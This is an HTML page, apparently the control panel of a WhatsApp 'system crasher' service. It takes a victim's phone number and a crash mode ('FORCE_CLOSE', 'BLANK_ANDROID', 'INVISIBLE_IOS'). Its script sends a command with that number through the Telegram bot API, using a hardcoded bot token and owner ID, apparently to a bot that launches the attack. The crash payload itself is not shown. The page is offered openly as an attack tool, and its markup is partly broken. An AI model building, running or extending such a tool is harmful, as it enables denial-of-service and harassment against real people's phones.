<!DOCTYPE html>
<html lang="id">
<head>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
body{background:#070710;color:white}

.top-header{text-align:center;padding:25px 0 10px}
.top-header h1{font-size:22px;letter-spacing:2px;font-weight:600;color:#e3d8ff;text-transform:uppercase}
.subtext{text-align:center;color:#9b9b9b;font-size:12px;margin-top:-4px}

.cover-box{width:92%;margin:15px auto;background:#11111f;border-radius:14px;overflow:hidden;border:1px solid #2e2e48;box-shadow:0 0 18px #7a36ff40}
.cover-box video{width:100%}

.info-box{display:flex;justify-content:space-between;align-items:center;padding:12px 18px 15px}
.name{font-size:20px;font-weight:600}
.vip{background:#f7cc32;padding:5px 12px;color:black;border-radius:30px;font-size:12px;font-weight:700}

.card{width:92%;margin:10px auto 0;background:#141427;border-radius:18px;border:1px solid #272753;padding:20px;box-shadow:0 0 18px #7a36ff30}
.card-title{font-size:18px;font-weight:600;margin-bottom:15px;color:#b397ff;border-bottom:2px solid #7a36ff;padding-bottom:6px;display:inline-block}

.input-group{margin-top:16px}
.input-group label{font-size:14px;color:#cfcfcf}
.input-group input{
  width:100%;
  margin-top:8px;
  padding:14px;
  border-radius:14px;
  border:none;
  background:#101020;
  color:white;
  outline:none;
  border:1px solid #33335a;
  font-size:15px
}

/* MODE GRID */
.mode-grid{
  display:grid;
  grid-template-columns:1fr 1fr;
  gap:14px;
  margin-top:18px;
}

.mode-card{
  background:#0f0f1f;
  border:1px solid #2b2b55;
  border-radius:18px;
  padding:20px 12px;
  text-align:center;
  transition:.25s;
}

.mode-card.active{
  border:1px solid #7a36ff;
  box-shadow:0 0 20px #7a36ff80;
}

.mode-icon{
  width:44px;
  height:44px;
  margin:0 auto 10px;
  border-radius:50%;
  background:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#000;
  font-weight:700;
  font-size:18px;
}

.mode-title{
  font-size:14px;
  margin-bottom:12px;
  letter-spacing:1px;
}

.select-btn{
  background:#fff;
  color:#000;
  border:none;
  padding:8px 22px;
  border-radius:20px;
  font-weight:700;
  cursor:pointer;
}

.btn{
  width:100%;
  padding:16px;
  margin-top:22px;
  background:linear-gradient(135deg,#7b2bff,#d04aff);
  border:none;
  border-radius:20px;
  color:white;
  font-size:19px;
  letter-spacing:1px;
  font-weight:700;
  cursor:pointer
}
.btn:active{transform:scale(.97)}

.log-box{
  width:92%;
  margin:25px auto;
  background:#0f0f20;
  border:1px solid #29294d;
  padding:15px;
  border-radius:16px;
  height:180px;
  overflow-y:auto;
  font-size:13px
}
</style>
</head>
<body>

<div class="top-header"><h1>EXECUTION | CORE</h1></div>
<div class="subtext">Copyright by @vinzzloww</div>

<div class="cover-box">
  <video src="https://files.catbox.moe/bd1bl7.mp4" autoplay loop muted></video>
</div>

<div class="info-box">
  <div class="name"></div>
  <div class="vip">VVIP</div>
</div>

<div class="card">
  <div class="card-title">VINZZ EXTERNALL - System Crasher</div>

  <div class="input-group">
    <label>üìû NOMOR TARGET</label>
    <input type="number" id="target" placeholder="Ex : 62xxx">
  </div>

  <div class="input-group">
    <label>‚ò£Ô∏è MODE EXECUTION</label>

    <div class="mode-grid">
      <div class="mode-card" onclick="selectMode(this,'DELAY_50')">
        <div class="mode-icon">‚è≥</div>
        <div class="mode-title">DELAY 50%</div>

      </div>

      <div class="mode-card" onclick="selectMode(this,'DELAY_100')">
        <div class="mode-icon">üïí</div>

        <button class="select-btn">SELECT</button>
      </div>

      <div class="mode-card" onclick="selectMode(this,'IPHONE_HARD')">
        <div class="mode-icon">üçé</div>

        <button class="select-btn">SELECT</button>
      </div>

      <div class="mode-card" onclick="selectMode(this,'BLANK_ANDROID')">

      </div>

      <div class="mode-card" onclick="selectMode(this,'INVISIBLE_IOS')">
        <div class="mode-icon">üö´</div>

        <button class="select-btn">SELECT</button>
      </div>

      <div class="mode-card" onclick="selectMode(this,'FORCE_CLOSE')">

  </div>

  <button class="btn" id="sendBtn" onclick="sendToWA()">LESTGOOOO ·Øì‚û§</button>
</div>

<div class="log-box" id="log"></div>

<script>
const TELEGRAM_BOT_TOKEN = "8426368219:AAEL_0WOOLSBJdKziPZ7SED_TQ8DveKE8cw";
const TELEGRAM_OWNER_ID = "6696150439";

/* ===== MODE COMMAND (EDIT SENDIRI) ===== */
const MODE_COMMAND = {
  DELAY_50: "/delayhardforever",
  DELAY_100: "/delayhardforever",
  IPHONE_HARD: "/delayhardforever",
  BLANK_ANDROID: "/forcenewforever",
  INVISIBLE_IOS: "/forcenewforever",
  FORCE_CLOSE: "/forcenewforever"
};

let selectedMode=null;
let cooldown=false;
let cooldownTime=10*60*1000;

function log(t){
  let box=document.getElementById("log");
  box.innerHTML+=`<div>> ${t}</div>`;
  box.scrollTop=box.scrollHeight;
}

function selectMode(el,mode){
  document.querySelectorAll('.mode-card').forEach(c=>c.classList.remove('active'));
  el.classList.add('active');
  selectedMode=mode;
  log("‚ò£Ô∏è Mode dipilih : "+mode);
}

function startCooldown(){
  cooldown=true;
  document.getElementById("sendBtn").disabled=true;
  log("‚è≥ Cooldown Active");
  setTimeout(()=>{
    cooldown=false;
    document.getElementById("sendBtn").disabled=false;
    log("‚úÖ Cooldown selesai");
  },cooldownTime);
}

async function sendToWA(){
  if(cooldown){log("‚ùå Cooldown aktif");return;}

  let nomor = document.getElementById("target").value.trim();

if(!/^[1-9]\d{6,15}$/.test(nomor)){
  log("‚ùå Nomor tidak valid (gunakan format internasional)");
  return;
  }

  if(!selectedMode){
    log("‚ùå Pilih MODE EXECUTION terlebih dahulu");
    return;
  }

  let command=MODE_COMMAND[selectedMode];
  let finalMessage=`${command} ${nomor}`;

  log("üöÄ Sending...");

  try{
    let s=await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({
        chat_id:TELEGRAM_OWNER_ID,
        text:finalMessage
      })
    });

    let r=await s.json();
    if(r.ok){
      log("‚úÖ Successfully Sent To Target");
      startCooldown();
    }else{
      log("‚ùå API Error");
    }
  }catch(e){
    log("‚ùå Connection Error");
  }
}
</script>
